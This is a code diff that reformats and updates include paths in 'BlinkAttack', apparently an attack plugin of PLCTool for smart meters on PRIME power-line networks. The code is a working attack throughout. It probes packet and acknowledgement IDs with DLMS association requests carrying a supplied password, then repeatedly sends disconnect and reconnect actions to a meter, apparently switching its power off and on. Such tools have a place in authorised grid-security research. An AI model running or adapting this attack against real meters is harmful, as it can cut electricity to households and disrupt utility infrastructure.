@@ -29,20 +29,20 @@
 
 #include "BlinkAttack.h"
 
-#include <PRIME/PrimeAdapter.h>
-#include <PRIME/PrimeFrame.h>
-#include <Topology/Concentrator.h>
-#include <Topology/Meter.h>
-#include <ber/ber.h>
-#include <ber/stream.h>
-#include <dlms/AarqApdu.h>
-#include <dlms/ActionRequestNormal.h>
-#include <dlms/DataArray.h>
-#include <dlms/DataInteger.h>
-#include <dlms/InitiateRequestApdu.h>
-#include <dlms/RlrqApdu.h>
-#include <gurux/include/enums.h>
-#include <util/defs.h>
+#include <PLCTool/PRIME/PrimeAdapter.h>
+#include <PLCTool/PRIME/PrimeFrame.h>
+#include <PLCTool/Topology/Concentrator.h>
+#include <PLCTool/Topology/Meter.h>
+#include <PLCTool/Types/ber/ber.h>
+#include <PLCTool/Types/ber/stream.h>
+#include <PLCTool/Types/dlms/AarqApdu.h>
+#include <PLCTool/Types/dlms/ActionRequestNormal.h>
+#include <PLCTool/Types/dlms/DataArray.h>
+#include <PLCTool/Types/dlms/DataInteger.h>
+#include <PLCTool/Types/dlms/InitiateRequestApdu.h>
+#include <PLCTool/Types/dlms/RlrqApdu.h>
+#include <PLCTool/gurux/include/enums.h>
+#include <PLCTool/util/defs.h>
 
 #include <QDateTime>
 #include <QObject>
@@ -53,13 +53,10 @@
 
 using namespace BlinkAttackPlugin;
 
-BlinkAttack::BlinkAttack(
-    QString const attackName,
-    PLCTool::StringParams const &params,
-    PLCTool::PrimeAdapter *adapter,
-    QObject *parent)
-    : Attack(attackName, adapter, parent)
-{
+BlinkAttack::BlinkAttack(QString const attackName,
+                         PLCTool::StringParams const &params,
+                         PLCTool::PrimeAdapter *adapter, QObject *parent)
+    : Attack(attackName, adapter, parent) {
   std::string snaString = params["SNA"].asString();
   this->sna = std::vector<uint8_t>(snaString.begin(), snaString.end());
   this->nid = params["NID"].asULong();
@@ -83,58 +80,30 @@ BlinkAttack::BlinkAttack(
   this->state = IDLE;
 }
 
-void
-BlinkAttack::connectAll(void)
-{
-  connect(
-      this->timeoutTimer,
-      SIGNAL(timeout(void)),
-      this,
-      SLOT(onTimeout(void)));
-  connect(
-      this->messageTimer,
-      SIGNAL(timeout(void)),
-      this,
-      SLOT(onMessageTime(void)));
+void BlinkAttack::connectAll(void) {
+  connect(this->timeoutTimer, SIGNAL(timeout(void)), this,
+          SLOT(onTimeout(void)));
+  connect(this->messageTimer, SIGNAL(timeout(void)), this,
+          SLOT(onMessageTime(void)));
 
-  connect(
-      this->adapter,
-      SIGNAL(frameReceived(
-          PLCTool::Concentrator *,
-          QDateTime,
-          bool,
-          const void *,
-          size_t)),
-      this,
-      SLOT(onFrameReceived(
-          PLCTool::Concentrator *,
-          QDateTime,
-          bool,
-          const void *,
-          size_t)),
-      Qt::BlockingQueuedConnection);
+  connect(this->adapter,
+          SIGNAL(frameReceived(PLCTool::Concentrator *, QDateTime, bool,
+                               const void *, size_t)),
+          this,
+          SLOT(onFrameReceived(PLCTool::Concentrator *, QDateTime, bool,
+                               const void *, size_t)),
+          Qt::BlockingQueuedConnection);
 
-  connect(
-      this->adapter,
-      SIGNAL(dataReceived(
-          PLCTool::Meter *,
-          QDateTime,
-          bool,
-          const void *,
-          size_t)),
-      this,
-      SLOT(onDataReceived(
-          PLCTool::Meter *,
-          QDateTime,
-          bool,
-          const void *,
-          size_t)),
-      Qt::BlockingQueuedConnection);
+  connect(this->adapter,
+          SIGNAL(dataReceived(PLCTool::Meter *, QDateTime, bool, const void *,
+                              size_t)),
+          this,
+          SLOT(onDataReceived(PLCTool::Meter *, QDateTime, bool, const void *,
+                              size_t)),
+          Qt::BlockingQueuedConnection);
 }
 
-void
-BlinkAttack::updateProgress()
-{
+void BlinkAttack::updateProgress() {
   if (this->state == IDLE)
     emit attackProgress(0);
   else if (this->state == SEQUENCING)
@@ -145,9 +114,7 @@ BlinkAttack::updateProgress()
     emit attackProgress(1.0);
 }
 
-void
-BlinkAttack::composeAARQ(void)
-{
+void BlinkAttack::composeAARQ(void) {
   this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
   this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;
 
@@ -177,26 +144,20 @@ BlinkAttack::composeAARQ(void)
   aarq.setCallingAuthenticationValue(this->password);
   initiateRequest.setProposedDLMSVersionNumber(6);
   initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_ACTION, true);
-  initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_EVENT_NOTIFICATION,
-      true);
-  initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_SELECTIVE_ACCESS,
-      true);
+  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_EVENT_NOTIFICATION,
+                                            true);
+  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_SELECTIVE_ACCESS,
+                                            true);
   initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_SET, true);
   initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_GET, true);
   initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_ACTION,
-      true);
+      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_ACTION, true);
   initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_SET_OR_WRITE,
-      true);
+      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_SET_OR_WRITE, true);
   initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_GET_OR_READ,
-      true);
+      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_GET_OR_READ, true);
   initiateRequest.setProposedConformanceBit(
-      DLMS_CONFORMANCE_PRIORITY_MGMT_SUPPORTED,
-      true);
+      DLMS_CONFORMANCE_PRIORITY_MGMT_SUPPORTED, true);
   initiateRequest.setClientMaxReceivePduSize(0x122);
   aarq.setUserInformation(initiateRequest.getBytes());
 
@@ -207,9 +168,7 @@ BlinkAttack::composeAARQ(void)
   this->frame->PDU.CL.DEST = 1;
 }
 
-void
-BlinkAttack::composeDisconnect(void)
-{
+void BlinkAttack::composeDisconnect(void) {
   this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
   this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;
 
@@ -254,9 +213,7 @@ BlinkAttack::composeDisconnect(void)
   this->frame->PDU.CL.DEST = 1;
 }
 
-void
-BlinkAttack::composeConnect(void)
-{
+void BlinkAttack::composeConnect(void) {
   this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
   this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;
 
@@ -299,9 +256,7 @@ BlinkAttack::composeConnect(void)
   this->frame->PDU.CL.DEST = 1;
 }
 
-void
-BlinkAttack::composeRelease(void)
-{
+void BlinkAttack::composeRelease(void) {
   this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
   this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;
 
@@ -334,47 +289,38 @@ BlinkAttack::composeRelease(void)
   this->frame->PDU.CL.DEST = 1;
 }
 
-void
-BlinkAttack::idToSna(PLCTool::NodeId id, uint8_t *sna)
-{
+void BlinkAttack::idToSna(PLCTool::NodeId id, uint8_t *sna) {
   unsigned int i;
 
-  for (i = 0; i < 6; ++i) sna[i] = (uint8_t) (id >> (5 - i) * 8);
+  for (i = 0; i < 6; ++i)
+    sna[i] = (uint8_t)(id >> (5 - i) * 8);
 }
 
-bool
-BlinkAttack::sequencingFound(void)
-{
-  return this->state == DISCONNECTING;
-}
+bool BlinkAttack::sequencingFound(void) { return this->state == DISCONNECTING; }
 
-bool
-BlinkAttack::isPacketExpected(unsigned char pktid)
-{
+bool BlinkAttack::isPacketExpected(unsigned char pktid) {
   return this->frame->PDU.ARQ.ACKID == pktid;
 }
 
-void
-BlinkAttack::transitionTo(State next)
-{
+void BlinkAttack::transitionTo(State next) {
   switch (next) {
-    case RELEASING:
-      this->composeRelease();
-      break;
-    case SEQUENCING:
-      this->composeAARQ();
-      break;
-    case CONNECTING:
-      this->composeConnect();
-      break;
-    case DISCONNECTING:
-      this->composeDisconnect();
-      break;
-    default:
-      this->messageTimer->stop();
-      if (this->cancelled)
-        emit this->attackCancelled();
-      break;
+  case RELEASING:
+    this->composeRelease();
+    break;
+  case SEQUENCING:
+    this->composeAARQ();
+    break;
+  case CONNECTING:
+    this->composeConnect();
+    break;
+  case DISCONNECTING:
+    this->composeDisconnect();
+    break;
+  default:
+    this->messageTimer->stop();
+    if (this->cancelled)
+      emit this->attackCancelled();
+    break;
   }
 
   this->state = next;
@@ -382,9 +328,7 @@ BlinkAttack::transitionTo(State next)
 
 //////////////////////////////////// Slots /////////////////////////////////////
 
-void
-BlinkAttack::onTimeout(void)
-{
+void BlinkAttack::onTimeout(void) {
   this->adapter->setLcd(0, "Timeout");
   this->adapter->setLcd(1, "reached");
   this->messageTimer->stop();
@@ -392,77 +336,68 @@ BlinkAttack::onTimeout(void)
   emit attackTimeout();
 }
 
-void
-BlinkAttack::onMessageTime(void)
-{
+void BlinkAttack::onMessageTime(void) {
   QString status;
   switch (this->state) {
-    case SEQUENCING:
-      status =
-          QString("AARQ probe with PKTID=%1 and ACKID=%2...")
-              .arg(QString::number(this->pktId), QString::number(this->ackId));
+  case SEQUENCING:
+    status =
+        QString("AARQ probe with PKTID=%1 and ACKID=%2...")
+            .arg(QString::number(this->pktId), QString::number(this->ackId));
 
-      emit this->attackStatus(status);
+    emit this->attackStatus(status);
 
-      this->adapter->writeFrame(this->frame->serialize());
+    this->adapter->writeFrame(this->frame->serialize());
 
-      pktId = (pktId + 1) % 0x3f;
-      ackId = (ackId + 1) % 0x3f;
+    pktId = (pktId + 1) % 0x3f;
+    ackId = (ackId + 1) % 0x3f;
 
-      break;
+    break;
 
-    case DISCONNECTING:
-      status =
-          QString("AARE found with PKTID=%1 and ACKID=%2... Disconnecting..")
-              .arg(QString::number(this->pktId), QString::number(this->ackId));
+  case DISCONNECTING:
+    status =
+        QString("AARE found with PKTID=%1 and ACKID=%2... Disconnecting..")
+            .arg(QString::number(this->pktId), QString::number(this->ackId));
 
-      emit this->attackStatus(status);
+    emit this->attackStatus(status);
 
-      this->adapter->writeFrame(this->frame->serialize());
+    this->adapter->writeFrame(this->frame->serialize());
 
-      break;
+    break;
 
-    case CONNECTING:
-      status =
-          QString("AARE found with PKTID=%1 and ACKID=%2... Connecting..")
-              .arg(QString::number(this->pktId), QString::number(this->ackId));
+  case CONNECTING:
+    status =
+        QString("AARE found with PKTID=%1 and ACKID=%2... Connecting..")
+            .arg(QString::number(this->pktId), QString::number(this->ackId));
 
-      emit this->attackStatus(status);
+    emit this->attackStatus(status);
 
-      this->adapter->writeFrame(this->frame->serialize());
+    this->adapter->writeFrame(this->frame->serialize());
 
-      break;
+    break;
 
-    case RELEASING:
-      status = QString("Releasing meter..");
+  case RELEASING:
+    status = QString("Releasing meter..");
 
-      emit this->attackStatus(status);
+    emit this->attackStatus(status);
 
-      this->adapter->writeFrame(this->frame->serialize());
-      this->transitionTo(IDLE);
+    this->adapter->writeFrame(this->frame->serialize());
+    this->transitionTo(IDLE);
 
-      break;
+    break;
 
-    default:
-      this->messageTimer->stop();
-      break;
+  default:
+    this->messageTimer->stop();
+    break;
   }
 }
 
-void
-BlinkAttack::onFrameReceived(
-    PLCTool::Concentrator *concentrator,
-    QDateTime,
-    bool downlink,
-    const void *data,
-    size_t size)
-{
+void BlinkAttack::onFrameReceived(PLCTool::Concentrator *concentrator,
+                                  QDateTime, bool downlink, const void *data,
+                                  size_t size) {
   uint8_t sna[6];
   this->idToSna(concentrator->id(), sna);
   PLCTool::PrimeFrame *frame = PLCTool::PrimeFrame::fromRawData(
-      sna,
-      static_cast<const uint8_t *>(data),
-      size);
+      sna, static_cast<const uint8_t *>(data), size);
 
   if (frame != nullptr && frame->PDU.macType == PLCTool::PrimeFrame::GENERIC &&
       frame->PDU.genType == PLCTool::PrimeFrame::DATA) {
@@ -471,7 +406,7 @@ BlinkAttack::onFrameReceived(
 
 #define SAME(x) frame->PDU.x == this->frame->PDU.x
     forMe = forMe && memcmp(frame->sna, this->frame->sna, 6) == 0;
-    forMe = forMe && !frame->PDU.HDR.DO;  // Has to be uplink (from Meter)
+    forMe = forMe && !frame->PDU.HDR.DO; // Has to be uplink (from Meter)
     forMe = forMe && SAME(PKT.LCID_CTYPE);
     forMe = forMe && SAME(PKT.SID);
     forMe = forMe && SAME(PKT.LNID);
@@ -491,35 +426,32 @@ BlinkAttack::onFrameReceived(
       this->ackId = frame->PDU.ARQ.PKTID + 1;
 
       switch (this->state) {
-        case SEQUENCING:
-          if (frame->PDU.DATA[0] == 0x0e ||
-              frame->PDU.DATA[0] == 0xd8)  // Error
-            this->transitionTo(RELEASING);
-          else if (frame->PDU.DATA[0] == 0x61 && frame->PDU.DATA != rejection)
-            this->transitionTo(DISCONNECTING);
+      case SEQUENCING:
+        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
+          this->transitionTo(RELEASING);
+        else if (frame->PDU.DATA[0] == 0x61 && frame->PDU.DATA != rejection)
+          this->transitionTo(DISCONNECTING);
 
-          break;
+        break;
 
-        case DISCONNECTING:
-          if (frame->PDU.DATA[0] == 0x0e ||
-              frame->PDU.DATA[0] == 0xd8)  // Error
-            this->transitionTo(RELEASING);
-          else if (frame->PDU.DATA[0] == 0xc7)
-            this->transitionTo(CONNECTING);
+      case DISCONNECTING:
+        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
+          this->transitionTo(RELEASING);
+        else if (frame->PDU.DATA[0] == 0xc7)
+          this->transitionTo(CONNECTING);
 
-          break;
+        break;
 
-        case CONNECTING:
-          if (frame->PDU.DATA[0] == 0x0e ||
-              frame->PDU.DATA[0] == 0xd8)  // Error
-            this->transitionTo(RELEASING);
-          else if (frame->PDU.DATA[0] == 0xc7)
-            this->transitionTo(DISCONNECTING);
+      case CONNECTING:
+        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
+          this->transitionTo(RELEASING);
+        else if (frame->PDU.DATA[0] == 0xc7)
+          this->transitionTo(DISCONNECTING);
 
-          break;
+        break;
 
-        default:
-          break;
+      default:
+        break;
       }
 
       this->timeoutTimer->stop();
@@ -531,20 +463,11 @@ done:
     delete frame;
 }
 
-void
-BlinkAttack::onDataReceived(
-    PLCTool::Meter *meter,
-    QDateTime timeStamp,
-    bool downlink,
-    const void *data,
-    size_t size)
-{
+void BlinkAttack::onDataReceived(PLCTool::Meter *meter, QDateTime timeStamp,
+                                 bool downlink, const void *data, size_t size) {
 }
 
-
-void
-BlinkAttack::onStart(void)
-{
+void BlinkAttack::onStart(void) {
   this->state = SEQUENCING;
   this->updateProgress();
 
@@ -560,9 +483,7 @@ BlinkAttack::onStart(void)
   emit attackStarted();
 }
 
-void
-BlinkAttack::onCancel(void)
-{
+void BlinkAttack::onCancel(void) {
   this->timeoutTimer->stop();
   this->transitionTo(RELEASING);
 
@@ -572,9 +493,7 @@ BlinkAttack::onCancel(void)
   this->cancelled = true;
 }
 
-void
-BlinkAttack::onEnd(void)
-{
+void BlinkAttack::onEnd(void) {
   this->timeoutTimer->stop();
   this->messageTimer->stop();
 
